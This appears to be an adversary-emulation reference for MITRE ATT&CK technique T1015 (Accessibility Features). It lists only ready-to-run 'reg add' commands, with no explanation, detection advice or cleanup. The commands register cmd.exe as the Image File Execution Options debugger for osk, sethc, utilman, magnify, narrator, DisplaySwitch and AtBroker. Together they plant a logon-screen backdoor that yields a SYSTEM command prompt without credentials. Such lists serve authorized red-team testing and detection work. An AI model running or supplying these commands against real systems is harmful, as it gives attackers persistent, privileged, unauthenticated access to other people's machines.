# Accessibility Features

## MITRE ATT&CK Technique:
[T1015](https://attack.mitre.org/wiki/Technique/T1015)

## osk.exe swap

    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f

## sethc.exe swap

    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f

## utilman.exe swap

    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f

## magnify.exe swap

    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f

## narrator.exe swap

    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f

## DisplaySwitch.exe swap

    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f

## AtBroker.exe swap

    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\AtBroker.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
